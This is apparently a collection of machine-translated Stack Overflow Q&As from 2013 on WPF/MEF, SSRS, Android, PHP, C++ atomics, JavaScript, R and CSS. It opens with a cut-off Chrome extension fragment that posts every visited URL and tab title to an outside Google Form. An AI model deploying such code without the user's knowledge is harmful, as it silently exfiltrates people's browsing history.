  var url = "https://docs.google.com/spreadsheet/formResponse?formkey=FORMKEY";
  req.open("POST", url, true);
  chrome.tabs.get(info.tabId,function(tab){
    var params = "entry.0.single=" + info.url + "&entry.1.single=" + tab.title; 
    req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    req.send(params);
  });
},
{ urls: ["<all_urls>"], types: ["main_frame"]}); 
```

# wpf - 所有层级的托管可扩展性框架 (MEF)

> ID：15750893
> 
> 赞同：2
> 
> 时间：2013-04-01T20:04:10.780
> 
> 标签：wpf, wcf, mef

我正在使用`WPF, EF, WCF, SQL`. 我想使用托管可扩展性框架 ( `MEF`) 来更好地管理将包含在我的应用程序中的“功能”。

我将“功能”定义为端到端功能（即 UI 到数据库），其中包括：

*   WPF 用户控件/屏幕
*   “共享”（客户端/服务器）EF 模型（可能是 STE 或 DBContext）
*   用于检索和保存数据的 WCF 服务
*   数据库访问类

见图。特征 A 和 B 是端到端表示的。 ![在此处输入图像描述](https://i.stack.imgur.com/EZzeT.png)

在我的研究中，我有一些 WPF 和 WCF MEF 实现的好例子：

WPF： http: [//goldytech.wordpress.com/2010/02/17/plug-ins-modules-development-with-mef-part-i/](http://goldytech.wordpress.com/2010/02/17/plug-ins-modules-development-with-mef-part-i/)

WCF：[http ://www.fidelitydesign.net/?p=390#comments](http://www.fidelitydesign.net/?p=390#comments)

但不是两者都在同一个应用程序中。

换句话说，我希望能够在客户端和服务器上删除`UI.FeatureC`/并让应用程序自动发现新功能。`Entities.FeatureC``DataAccess.FeatureC``Entities.FeatureC`

让 MEF 部件在每一层中定义一个“特性”似乎是可行的，对吧？还是有更好的方法来构建它？

另外，我有点担心数据库以及它如何支持动态组合的应用程序。我想唯一的选择是确保数据库有适当的表、存储过程等，并坚持下去。

有没有人尝试在应用程序范围内实施 MEF？有什么好的参考或建议吗？

谢谢！

# reporting-services - 如何处理 IIF 或 Switch 除以零给出#ERROR？

> ID：15750896
> 
> 赞同：1
> 
> 时间：2013-04-01T20:04:16.983
> 
> 标签：reporting-services, ssrs-2008, ssrs-2008-r2

我尝试使用`IIF`和`Switch`大小写，但是当出现除以零错误时，我无法处理 N/A 案例。例如：

```
=switch(
    ReportItems!Textbox54.Value = 0, "N/A",
    ReportItems!Textbox54.Value <> 0, ((ReportItems!Textbox56.Value) / (ReportItems!Textbox54.Value))) 
```

如果没有这个，我会得到 N/A：

```
ReportItems!Textbox54.Value <> 0, ((ReportItems!Textbox56.Value) / (ReportItems!Textbox54.Value) 
```

但是，如果添加此条件，我会收到错误消息吗？

我正在使用 SSRS 2008 R2。

输出：

> 19.47%
> 13.85%
> #错误

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-01T23:23:06.933

IIF 函数的问题在于它是一个*函数*而不是语言构造。这意味着它在将参数传递给函数之前**评估这两个参数。**因此，如果您有除以零错误，这将被评估并导致一个`#ERROR`条件，即使看起来由于语句的布尔条件而不应执行该代码`IIF`。

此问题有两种解决方法：

**IIF 旁路**

基本上进行两次 IIF 函数调用，您不会得到除以零的错误：

```
=IIF(ReportItems!Textbox54.Value <> 0, 
    ReportItems!Textbox56.Value / IIF(ReportItems!Textbox54.Value = 0, 1, ReportItems!Textbox54.Value),
    "N/A") 
```

因此，如果 ReportItems!Textbox54.Value 为零，则除以 1，将结果丢弃并使用 N/A。

**自定义代码**

在自定义代码中创建安全除以零函数，您可以在其中使用真实语言构造。

```
Public Function SafeDivide(ByVal Numerator As Decimal, ByVal Denominator As Decimal) As Decimal
    If Denominator = 0 Then
       Return 0
    End If
    Return (Numerator / Denominator)
End Function 
```

然后在您的报告中将其用于值表达式而不是 IIF 或 SWITCH：

```
=Code.SafeDivide(ReportItems!Textbox56.Value, ReportItems!Textbox54.Value) 
```

并使用格式字符串将零显示为“N/A”：

```
#,##0.00;-#,##0.00;N/A 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-11-01T08:16:12.890

试试下面的代码

```
 =IIF(ReportItems!Textbox54.Value = 0,nothing, IIF(ReportItems!Textbox54.Value = 0,1,ReportItems!Textbox56.Value) / IIF(ReportItems!Textbox54.Value = 0,1,ReportItems!Textbox54.Value) ) 
```

永不为零的条件

# android - 如何在 Android 中解析和渲染复杂的 XML 文档？

> ID：15750900
> 
> 赞同：1
> 
> 时间：2013-04-01T20:04:19.340
> 
> 标签：android, xml

我想制作一个从 web 获取需要解释和呈现的 XML 文档的应用程序，例如：

```
<doc>
    <entity type="person">You</entity> can also look at <ref to="A">A</ref> or <ref to="B">B</ref>.
</doc> 
```

这些文档有一个相当复杂的 DTD 和一个**非静态**的结构，并且可能包含数千个标签。

假设我希望将`ref`元素呈现为可点击元素，并且暂时忽略其他标签（仅将它们显示为普通文本）。

我是否应该使用 扫描文件，`XmlPullParser`从文档中创建内部数据结构并`TextViews`为所有文本序列创建并让`ref`标签可点击`TextViews`？（这是 Android 开发资源['Parsing XML Data'](http://developer.android.com/training/basics/network-ops/xml.html)中描述的方法。）

或者，将文档转换为 HTML 并使用`WebView`? 或者做一些其他的解析技巧，比如使用[SimpleXML](http://simple.sourceforge.net/)而不是`XmlPullParser`反序列化 XML？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:40:06.280

更大的问题是“什么时候”你这样做？apk 中的 XML 不会保留为 xml，它是已编译的，因此，在运行时加载您描述的 xml 是没有意义的，因为当一切都说完后，您将不得不将其翻译成一堆动态的显示代码。

或者您是说您正在编写一个应用程序，该应用程序获取您的 xml，然后将其转换为您将要剪切并粘贴到您的项目中的 Android 样式 UI XML？

如果您打算简单地使用 WebView，那么您不必担心任何原生 Android UI 小部件（即 TextView），并且您可以以任何您希望的方式呈现 XML，但是，我怀疑这不是您要问的，而且我进一步怀疑您对 Android 使用 XML 的性质有些困惑。

或者您希望将您的 XML 转换为 Android 原生 XML，然后在运行时对其进行扩展？（根据文档，此时这是不可能的：“出于性能原因，视图膨胀在很大程度上依赖于在构建时完成的 XML 文件的预处理。因此，目前无法将 LayoutInflater 与 XmlPullParser 一起使用运行时的纯 XML 文件；它仅适用于从已编译资源（R.something 文件）返回的 XmlPullParser。” [在此处阅读更多内容](http://developer.android.com/reference/android/view/LayoutInflater.html) ）。

我认为您需要稍微澄清一下您的问题才能获得有用的答案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T23:13:14.570

在 a 中显示 XML 和一些 CSS`WebView`是最简单的。

或者，您可以使用 进行预处理`XmlPullParser`，并且对于渲染/样式设置，您可以使用 Android 的[Html](http://developer.android.com/reference/android/text/Html.html)类以及 TagHandler 的自定义实现和/或使用 Spannable 做一些事情。（请参阅[this answer](https://stackoverflow.com/a/2731685/673206) about using Spannable Strings。）使用`TextView.setText(Html.fromHtml())`.

# java - 用 Java 解析 Youtube API 日期

> ID：15750904
> 
> 赞同：10
> 
> 时间：2013-04-01T20:04:30.117
> 
> 标签：java, youtube

我可以在 SimpleDateFormat 中使用的 youtube api 上传日期的格式是什么？

示例“ `2013-03-31T16:46:38.000Z`”

PS解决方案找到了`yyyy-MM-dd'T'HH:mm:ss.SSSX`

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2015-11-24T17:13:40.727

这是一个[ISO 8061 日期时间](https://en.wikipedia.org/wiki/ISO_8601)

实际上，至少在 Java8 中，解析那个非常简单，因为有一个预定义的`DateTimeFormatter`. 这里有一个小单元测试作为演示：

```
import org.junit.Test;

import java.time.ZoneOffset;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;

import static org.junit.Assert.assertEquals;

public class DateTimeFormatterTest {

    @Test
    public void testIsoDateTimeParse() throws Exception {
        // when
        final ZonedDateTime dateTime = ZonedDateTime.parse("2013-03-31T16:46:38.000Z", DateTimeFormatter.ISO_DATE_TIME);

        // then
        assertEquals(2013, dateTime.getYear());
        assertEquals(3, dateTime.getMonthValue());
        assertEquals(31, dateTime.getDayOfMonth());
        assertEquals(16, dateTime.getHour());
        assertEquals(46, dateTime.getMinute());
        assertEquals(38, dateTime.getSecond());
        assertEquals(ZoneOffset.UTC, dateTime.getZone());
    }
} 
```

在 Java8 之前，我会看看[Converting ISO 8601-compliant String to java.util.Date](https://stackoverflow.com/questions/2201925/converting-iso-8601-compliant-string-to-java-util-date)和 definitley default to using [Joda Time](http://www.joda.org/joda-time/) with sth。喜欢：

```
final org.joda.time.DateTime dateTime = new org.joda.time.DateTime.parse("2013-03-31T16:46:38.000Z"); 
```

顺便说一句，不要使用`new DateTime("2013-03-31T16:46:38.000Z")`，因为它会使用您的默认时区，这可能不是您想要的。

# php - 为简单的应用程序生成 PHAR

> ID：15750913
> 
> 赞同：25
> 
> 时间：2013-04-01T20:05:06.913
> 
> 标签：php, packaging, composer-php, phar, symfony-components

我正在尝试使用 Symfony2 控制台库构建 CLI 工具。我有一些基本的工作，现在我想把它打包成一个 phar。我已经阅读了一些示例，但我看到的示例非常简单（3 个文件，没有命名空间等）。

在我的`src/`目录中，我有以下内容：

![在此处输入图像描述](https://i.stack.imgur.com/TpHAV.png)

上面`src/`我有一个`console.php`我执行来运行应用程序。我也有一个`vendors/`目录，因为我正在使用 composer 安装依赖项。`console.php`很简单：

```
#!/usr/bin/env php
<?php

set_time_limit(0);
$loader = require 'vendor/autoload.php';

use Symfony\Component\Console\Application;
use Bendihossan\Pinfo\Command\EnvironmentCommand;
use Bendihossan\Pinfo\Command\ExtensionsCommand;
use Bendihossan\Pinfo\Command\RunAllCommand;

$console = new Application();

$console->add(new RunAllCommand());
$console->add(new EnvironmentCommand);
$console->add(new ExtensionsCommand);

$console->run(); 
```

根据我对构建 phar 的了解（很少），我认为我需要将其`console.php`作为存根和其他所有内容`src/`以及我在`vendors/`.

[查看phpmaster.com](http://phpmaster.com/packaging-your-apps-with-phar/)上的示例代码，他们使用 手动指定要包含在 phar 中的每个文件`file_get_contents`，但我需要维护我的目录结构以使用作曲家的自动加载器并保持 PSR-0 目录结构。

**有没有一种简单的方法来创建 .phar 并在其中维护我的目录结构，以便我仍然可以使用 composer 的自动加载器？**

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-04-01T20:55:55.867

我建议你看看[Composer 的`Compiler`](https://github.com/composer/composer/blob/master/src/Composer/Compiler.php)（它最初是由 Silex 的 Fabien Potencier 创建的）。在该课程中，您可以看到像 Composer 这样的大型控制台应用程序是如何创建`.phar`文件的。

* * *

一些有趣的部分：

```
// line 49
$phar = new \Phar($pharFile, 0, 'composer.phar');
$phar->setSignatureAlgorithm(\Phar::SHA1);

$phar->startBuffering(); 
```

[`Phar#startBuffering`](http://php.net/phar.startbuffering)开始创建 phar 文件。

```
// Line 54
$finder = new Finder();
$finder->files()
    ->ignoreVCS(true)
    ->name('*.php')
    ->notName('Compiler.php')
    ->notName('ClassLoader.php')
    ->in(__DIR__.'/..') 
```

在这里，Composer 使用[Symfony2 Finder 组件](http://symfony.com/doc/current/components/finder.html)来查找目录中的每个文件`src`（除了这个文件和自动加载器）。

```
// Line 63
foreach ($finder as $file) {
    $this->addFile($phar, $file);
} 
```

在这里，Composer 遍历每个找到的文件并将其添加到 Phar 存档中。（您可以在[第 116 行](https://github.com/composer/composer/blob/master/src/Composer/Compiler.php#L116-130)`Compiler#addFile`查看方法）。

这重复了几次。然后在第 93 行，使用了 Composer 自动加载器：

```
$this->addFile($phar, new \SplFileInfo(__DIR__.'/../../vendor/autoload.php'));
$this->addFile($phar, new \SplFileInfo(__DIR__.'/../../vendor/composer/autoload_namespaces.php'));
$this->addFile($phar, new \SplFileInfo(__DIR__.'/../../vendor/composer/autoload_classmap.php'));
$this->addFile($phar, new \SplFileInfo(__DIR__.'/../../vendor/composer/autoload_real.php')); 
```

因为 Phar 是一个流，所以目录结构保存在 phar 文件中，并且 Composer 自动加载器仍然能够加载类。

然后，最后，添加存根并停止缓冲：

```
$phar->setStub($this->getStub());

$phar->stopBuffering(); 
```

（参见第[173 行](https://github.com/composer/composer/blob/master/src/Composer/Compiler.php#L173-203)`Compiler#getStub`的方法）。该方法停止创建 phar 并将其保存到 phar 文件中。[`Phar#stopBuffering`](http://php.net/phar.stopbuffering)

为了完成这个故事，Composer 创建了一个非常简单的 CLI[编译文件](https://github.com/composer/composer/blob/master/bin/compile)来运行这个命令。

# c++ - 初始化 std::atomic_bool？

> ID：15750917
> 
> 赞同：46
> 
> 时间：2013-04-01T20:05:24.990
> 
> 标签：c++, c++11, visual-studio-2012, atomic

我想使用`std::atomic_bool`，因为我想要一个应该由不同线程访问的布尔值。

它是一个`static`成员变量。问题是我想将它初始化`false`为第一个状态。通常我会这样做： `std::atomic_bool World::mStopEvent = false;`

但问题似乎是它没有`false`作为构造函数。那么我应该如何初始化这样一个变量呢？我正在使用 VS 2012。

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2013-04-01T20:13:33.067

这是[Visual Studio 2012（称为 VC11）中的一个已知问题](http://connect.microsoft.com/VisualStudio/feedback/details/720151/c-11-unsupported-std-atomic-bool-constructor)，您应该对现有的 Connect 项目进行投票，以便 Microsoft 知道它会影响更多人，因为他们推迟了修复。

> 你好，
> 
> 感谢您报告此错误。我是 Microsoft 的 STL 维护者，我想让你知道，虽然这个错误在我们的数据库中仍然存在，但它不会在 VC11 RTM (VS 2012 RTM) 中得到修复。所有错误对我们都很重要，但有些错误比其他错误更严重，并且上升到我们优先级队列的顶部。
> 
> 我在 STL 的所有活动 Connect 错误中复制并粘贴此响应，但以下简洁的注释特别适用于您的错误：
> 
> *   是的，我们在 , 等上缺少这些构造函数`atomic_bool`（`atomic_int`,`atomic<bool>`等`atomic<int>`有它们）。29.5 [atomics.types.generic]/7 说“应有与 atomic 的整体特化相对应的命名类型，如表 145 中所指定，以及`atomic_bool`与指定的 . 相对应的命名类型`atomic<bool>`。每个命名类型都是`typedef`相应特化的一个或相应特化的基类。如果是基类，则应支持与相应特化相同的成员函数。这让我真的很想使用 typedefs（1 种类型总是比 2 种类型简单），但我需要看看这是否会引入任何其他问题。
> 
> 我不能保证我们什么时候能够解决这个错误，但我们希望尽快解决（当发生这种情况时我会发送另一个回复）——我们的第一个机会将是“带外” Herb Sutter 在 GoingNative 2012 会议上宣布的 VC11 和 VC12 之间的发布。
> 
> 注意：Connect 不会通知我有关评论的信息。如果您有任何进一步的问题，请给我发电子邮件。
> 
> Stephan T. Lavavej 高级开发人员 - Visual C++ 库 stl@microsoft.com

基本上，你现在需要使用`std::atomic<T>`。

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2015-07-02T09:35:45.413

试试这个：

```
atomic_bool my_bool = ATOMIC_VAR_INIT(false); 
```

[http://en.cppreference.com/w/cpp/atomic/ATOMIC_VAR_INIT](http://en.cppreference.com/w/cpp/atomic/ATOMIC_VAR_INIT)

* * *

## 回答 #3

> 赞同：26
> 
> 时间：2013-04-01T20:14:34.070

**问题：**

您不能使用*copy-initialization*，因为`std::atomic_bool`它不可复制：

```
std::atomic_bool World::mStopEvent = false; // ERROR! 
```

其实上面等价于：

```
std::atomic_bool World::mStopEvent = std::atomic_bool(false); // ERROR! 
```

但是，您可以使用*直接初始化*：

```
std::atomic_bool World::mStopEvent(false); 
```

根据您的意愿，您可以选择使用大括号而不是括号：

```
std::atomic_bool World::mStopEvent{false}; 
```

**漏洞：**

尽管无论您选择哪种编译器，复制初始化都是非法的，但似乎 VC11 附带的标准库的实现有一个错误，它也不允许您执行直接初始化。

> 那么我应该如何初始化这样一个变量呢？

**解决方法：**

作为一种可能的解决方法，您可以提供一对静态 getter/setter 包装器，它们分别设置和返回原子布尔标志的值，但在确保它至少初始化一次且不超过一次之前不要以线程安全的方式所需的初始值（您可以考虑这是某种延迟初始化）：

```
#include <atomic>
#include <mutex>

struct World
{
    static bool is_stop_event_set()
    {
        std::call_once(mStopEventInitFlag, [] () { mStopEvent = false; });
        return mStopEvent;
    }

    static void set_stop_event(bool value)
    {
        std::call_once(mStopEventInitFlag, [value] () { mStopEvent = value; });
        mStopEvent = value;
    }

    static std::atomic_bool mStopEvent;
    static std::once_flag mStopEventInitFlag;
};

std::atomic_bool World::mStopEvent;
std::once_flag World::mStopEventInitFlag; 
```

现在不是`mStopEvent`直接访问，而是通过`is_stop_event_set()`函数读取它的值：

```
#include <iostream>

int main()
{
    std::cout << World::is_stop_event_set(); // Will return false
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-01T20:09:39.783

怎么样：

```
std::atomic_bool World::mStopEvent(false); 
```

# php - 在 Kohana 加载和调用外部库

> ID：15750920
> 
> 赞同：3
> 
> 时间：2013-04-01T20:05:37.567
> 
> 标签：php, kohana, composer-php

我不知道如何在 Kohana 包含和调用外部库。

我正在使用 Kohana，通过使用作曲家我已将**[tmhOAuth](https://github.com/themattharris/tmhOAuth)**库加载到供应商文件夹。作曲家说 - 自动加载器文件已创建，但我不知道 - Kohana 是否加载了该自动加载器文件。

自动加载路径-> **vendor/autoload.php**
库文件路径 -> **vendor/themattharris/tmhoauth/tmhOAuth.php**

1）我必须包括一些东西吗？如果是 - 什么？自动加载器文件或带有库类的文件？2）如何从我的控制器调用一些库的方法？

抱歉，我对 Kohana 很陌生。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-03T22:43:27.313

更好用`Kohana::find_file`：

```
require_once Kohana::find_file('vendor', 'autoload');
$tmh = new tmhOAuth(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-01T20:30:11.777

[这篇文章](https://stackoverflow.com/questions/13116416/php-composer-with-solarium-library?rq=1)帮助我解决了这个问题

```
include_once './vendor/autoload.php';
$tmh = new tmhOAuth(); 
```

# php - 无法在 PHP 中获取准备好的语句以与 MySQL 一起使用

> ID：15750924
> 
> 赞同：-1
> 
> 时间：2013-04-01T20:06:06.163
> 
> 标签：php, mysql, mysqli, prepared-statement

在`mysql`控制台我有这个

```
mysql> SELECT `name`, `lastname` FROM `tblStudents` WHERE `idStudent`='2';
+--------------+-----------------+
|     name     |    lastname     |
+--------------+-----------------+
|     Lucio    |    Martínez     |
+--------------+-----------------+
1 row in set (0.00 sec) 
```

所以我想在 PHP 中使用准备好的语句来获取这个学生的姓名和姓氏。

这是代码：

```
$mysqli = $this->ConnectLowPrivileges();
echo 'Connected<br>';
$stmt = $mysqli->prepare("SELECT `name`, `lastname` FROM `tblStudents` WHERE `idStudent`=?");
if (false==$stmt){
    die('prepare() failed: ' . htmlspecialchars($mysqli->error));
}
$id = 2;
if ($rc = $stmt->execute(array($id))){
    if ($row = $stmt->fetch()){
        echo "Name: {$row[0]}.<br>Last name: {$row[1]}.<br>";
        echo 'Another way:'.print_r($row);
    }
}
if (false==$rc){
    die('execute() failed: ' . htmlspecialchars($stmt->error));
}
echo 'done';
mysqli_close($mysqli);
return true; 
```

第二个条件给出 false ，我得到的输出是这样的：

```
Connected
execute() failed: 
```

PHP 可以毫无问题地与数据库建立连接。

我不知道确切的错误，因为`$stmt->error`什么都不返回。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:39:46.010

为避免进一步评论，请阅读我在该问题上发布的所有评论和链接以了解，并将代码更改为：

```
$mysqli = $this->ConnectLowPrivileges();
echo 'Connected<br>';
$stmt = $mysqli->stmt_init();
$stmt->prepare("SELECT `name`, `lastname` FROM `tblStudents` WHERE `idStudent`=?");

$id = 2;
$stmt->bind_param('i', $id);
if ($stmt->execute()){
    $stmt->bind_result($name, $lastname);
    if ($stmt->fetch()){
        echo "Name: {$name}<br>Last name: {$lastname}<br>";
        //echo 'Another way:'.print_r($row, true); //won't work with bind_result
    } else {
        echo "No results";
    }
} else {
    die('execute() failed: ' . htmlspecialchars($stmt->error));
}
echo 'done';
stmt->close();
$mysqli->close(); 
```

# java - 如何在 vim 中正确缩进注释？

> ID：15750925
> 
> 赞同：2
> 
> 时间：2013-04-01T20:06:09.077
> 
> 标签：java, vim, annotations, indentation

我无法让 vim 在 Java 注释（如`@Override`或`@Test`）之后正确缩进文本。我试图使用[此页面](https://stackoverflow.com/questions/200932/how-do-i-make-vim-indent-java-annotations-correctly)的第二个答案。在我尝试了那里找到的解决方案后，它仍然没有正确缩进。

当 java.vim 文件和我的 .vimrc 都被加载时，没有什么不同（我怀疑我的 .vimrc 中定义的 smartindent 优先），当我加载 vim 时没有 .vimrc 和 :source ~/.vim/after /indent/java.vim 手动它通过删除所有缩进来缩进所有内容（将所有内容移到最左边）。

我在 Mac OS X 10.8.2 上运行 VIM 7.3。有小费吗？这是我的 .vim 文件夹，因此您可以仔细检查文件：[https](https://github.com/ElliotPenson/.vim) ://github.com/ElliotPenson/.vim谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2018-11-30T05:01:14.397

您问这个问题已经有一段时间了，我不确定您的设置是否已更改，但是您包含的 github 文件夹缺少`after/indent/java.vim`您链接的其他问题提到的文件。这将是该答案为您工作的关键。

# javascript - 如何仅在元素的子级上运行 getElementsByTagName？

> ID：15750927
> 
> 赞同：6
> 
> 时间：2013-04-01T20:06:16.330
> 
> 标签：javascript, selection, children, getelementsbytagname

我无法让选择器正常工作。

我有这个 HTML：

```
<div.wrapper>
    <div.ui-controlgroup-controls>
        <form>
            <div.ui-btn></div>
        </form>
        <div.ui-btn></div>
        <div.ui-btn></div>
        <div.ui-btn></div>
        <div.ui-btn></div>
    </div>
</div> 
```

我正在尝试选择`div`标签，它们是`ui-controlgroup-controls`- 这意味着排除表单内的内容。

这就是我正在尝试的：

```
// el is my div.wrapper element
el.children[0].getElementsByTagName("div"); 
```

但是这不起作用，因为表单内的 div 最终出现在选择中。

**问题**：
当我不想使用 jQuery 时，如何正确选择元素？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-01T20:08:57.397

一种方法是遍历生成的节点列表并检查父节点：

```
var nodes = el.children[0].getElementsByTagName("div");
nodes = Array.prototype.slice.call(nodes);
nodes = nodes.filter(function(v, i){
    return v.parentElement === el.children[0]; 
}); 
```

这是这种方法的演示：http: [//jsfiddle.net/WLhY2/](http://jsfiddle.net/WLhY2/)

一种更简单（尽管效率较低）的方法是使用`querySelectorAll`选择器表达式来检索相关节点：

```
var divs = document.querySelectorAll('div.ui-controlgroup-controls > div') 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-01T20:42:28.347

对于支持[querySelectorAll](https://developer.mozilla.org/en-US/docs/DOM/Document.querySelectorAll)的浏览器：

```
var divs = el.children[0].querySelectorAll("div"); 
```

对于支持在 NodeList 上使用[slice](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/slice)的浏览器（例如不是 IE，至少不是 IE < 9）：

```
var slice = Function.call.bind(Array.prototype.slice);

var divs = slice(el.children[0].children).filter(function(node) { 
               return node.tagName === "DIV"
           }); 
```

对于不支持的浏览器：

```
var nodes = el.children[0].children;
var divs = [];

for (var l = nodes.length, node; node = nodes[--l];) {
  if (node.tagName === "DIV")
    divs.push(node);
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-01T20:09:54.960

在大多数浏览器中，您可以执行以下操作：

```
el.querySelectorAll(".ui-controlgroup-controls > div") 
```

* * *

`".ui-controlgroup-controls"`但是，如果您想避免更深的嵌套，这可能会产生误报。

如果是这种情况，只需迭代`.children`, 并构建嵌套 div 的集合。

```
var divs = [];

for (var i = 0, len = el.children.length; i < len; i++) {
    if (el.children[i].classname === "ui-controlgroup-controls") {
        for (var j = 0, lenj = el.children[i].children.length; j <, lenj; j++) {
            if (el.children[i].children[j].nodeName === "DIV") {
                divs.push(el.children[i].children[j])
            }
        }
    }
} 
```

* * *

如果知道您只有一个`ui-controlgroup-controls`元素，那么您可以摆脱外部循环，只需使用`children[0]`.

```
var divs = [];

for (var j = 0, lenj = el.children[0].children.length; j <, lenj; j++) 
    if (el.children[0].children[j].nodeName === "DIV") 
        divs.push(el.children[o].children[j]) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-11-19T23:34:43.347

```
<your-element>.querySelectorAll(":scope > div"); 
```

`:scope`是表示父元素的伪类。IE 中不支持，但有一个[shim](https://github.com/lazd/scopedQuerySelectorShim)。

# php - 如何创建带有返回 url 的 Facebook 分享链接？

> ID：15750929
> 
> 赞同：1
> 
> 时间：2013-04-01T20:06:25.323
> 
> 标签：php, javascript, jquery, facebook, facebook-sharer

我想知道如何制作一个 Facebook 分享链接，它有一个返回值可以转到不同的页面。我已经读到，虽然仍然可用，但当 Facebook 启动“赞”按钮时，Facebook 分享按钮已被弃用，而“赞”按钮包含 URL 的赞、分享和消息的总和。

对于这个问题，我使用了不同的情况，其中非常相似。一旦用户点击分享，它将打开一个 JQuery 对话框，在 Facebook 分享的一侧有一个 iframe。当用户点击分享时，我想知道如何监听这个，所以我可以添加到我自己的带有计数器的自定义分享按钮，然后也重定向到一个不同的 URL，该 URL 为他们提供分享我们的

我创建了一个带有按钮的基本对话框，可以在 JSFiddle 上打开它：http: [//jsfiddle.net/kbJ57/](http://jsfiddle.net/kbJ57/)

```
<a href="#" id="open">Share This!</a>

<div id="dialog-message" title="Share on Facebook!">
        <p>iFrame goes here</p>
</div> 
```

这个例子，请在用户分享后显示类似谷歌的内容，如果你能帮助编程，请显示任何随机页面分享，如果你愿意，我非常感谢你。

最好的祝福，

蒂姆

**编辑：**查看我玩的游戏页面，底部有一个分享按钮，所以我想你仍然可以分享，我只是不知道该怎么做。（链接：[http](http://services.runescape.com/m=news/behind-the-scenes-april-2013) ://services.runescape.com/m=news/behind-the-scenes-april-2013 ）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T21:38:11.960

简短的回答是，您需要创建一个 facebook 应用程序并将其集成到您的网站中以便进行共享。

有关更多信息，请参见 developer.facebook.com。据我所知，没有一种“简单”的方式来进行 Facebook 共享，因为它需要用户授权您代表他们发布。

编辑：我最初误解了提问者的意图。尝试使用 facebook 分享器：www.facebook.com/sharer.php?u= [您要分享的网址已正确转义]

使用 opengraph 标签格式化您网站的元数据，让 facebook 获取内容。这里有很好的细节：http: [//alistapart.com/article/like-able-content-spread-your-message-with-third-party-metadata](http://alistapart.com/article/like-able-content-spread-your-message-with-third-party-metadata)

# r - 更改条形图中条形的宽度 (R)

> ID：15750931
> 
> 赞同：8
> 
> 时间：2013-04-01T20:06:32.090
> 
> 标签：r, width, bar-chart

我想知道如何更改 barchart() 函数中条形的宽度。

这是代码：

```
rater1 <- c(0.75, 0.66, 0.73,   0.63)
barplot(rater1, ylim=c(0:1),axes = TRUE, names.arg = c("A", "B", "C", "D"), axisnames=TRUE, col="grey70") 
```

是否也可以在条形上方放置值标签？

谢谢。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-04-01T20:12:09.653

来自`?barplot`：

> 空间：每个条之前留下的空间量（作为平均条宽度的一部分）。可以以单个数字或每个小节一个数字的形式给出。[...]

因此，例如，比较：

```
tN <- table(Ni <- stats::rpois(100, lambda = 5))
barplot(tN, col = rainbow(20))

barplot(tN, col = rainbow(20), space=0)

barplot(tN, col = rainbow(20), space=10) 
```

# css - 在纯色背景上添加透明渐变

> ID：15750935
> 
> 赞同：3
> 
> 时间：2013-04-01T20:06:46.720
> 
> 标签：css, gradient, opacity, alpha

我正在寻找一种创建模块化渐变的方法，该渐变可以通过将其添加为 LESS mixin 来应用于任意数量的项目。

例如，假设您有一个扁平的红色按钮，您也想应用渐变。我不想选择你的基本红色和一个较深的红色在渐变中淡入淡出，我想在平坦的红色按钮背景上覆盖一个黑色渐变（顶部是透明的）。虽然它只是一种颜色（黑色），但褪色会产生一种从黑色褪色到红色的错觉。理论上，您可以以一种方式将相同的渐变混合叠加到多个项目上。不必定义大量不同的梯度值。

这是纯 CSS 中的示例代码，我认为它应该如何工作，但没有：

```
.btn {
 background: red;
 background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, 0.1)), to(rgba(0, 0, 0, 1)), color-stop(1,black)); 
```

}

此代码将导致加载渐变（黑色）。除非将红色设置为背景 div 或主体颜色，否则红色不会显示出来。我想把它附加到同一个班级。这是 LESS 版本：

```
.gradient (@startColor: fade(@black, 0%), @endColor: fade(@black, 50%)) {
 background-color: @black;
 background: -webkit-gradient(linear, left top, left bottom, from(@startColor), to(@endColor), color-stop(1,#000000)); 
```

}

我能做到的最接近我想要做的是将背景颜色设置为红色，然后在其上放置半透明渐变。但是，我想在内联按钮上设置目标颜色，等等……这是一个[小提琴](http://jsfiddle.net/G55ya/)，显示了彩色背景上的透明渐变。

是否可以将颜色值附加到实际项目（按钮）的背景？渐变加载在顶部？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-01T20:25:08.213

在您提供的代码中，第二个`background`声明完全替换了第一个声明，因为您使用了速记`background`属性，而不仅仅是将 设置`background-image`为渐变。您可以将`background-color`第一个和`background-image`第二个中的 the 组合成一个`background`声明：

```
.btn {
    background: red -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, 0.1)), to(rgba(0, 0, 0, 1)));
} 
```

[JSFiddle](http://jsfiddle.net/qkJaU/1/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T20:11:10.590

这是你在想什么[http://jsfiddle.net/kevinPHPkevin/G55ya/1/](http://jsfiddle.net/kevinPHPkevin/G55ya/1/)

```
<div>
    <a class="btn">button</a>
</div> 
```

它基本上是将颜色分配给 div 而不是 body

# javascript - 在没有 Canvas 的情况下读取图像像素

> ID：15750941
> 
> 赞同：1
> 
> 时间：2013-04-01T20:06:57.483
> 
> 标签：javascript, html, image

有没有办法在不使用 Canvas 及其 getImageData 方法的情况下从 Image 中读取像素？Canvas 是 HTML5 功能，在 IE8 及更低版本中不可用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T20:17:21.557

两种方法

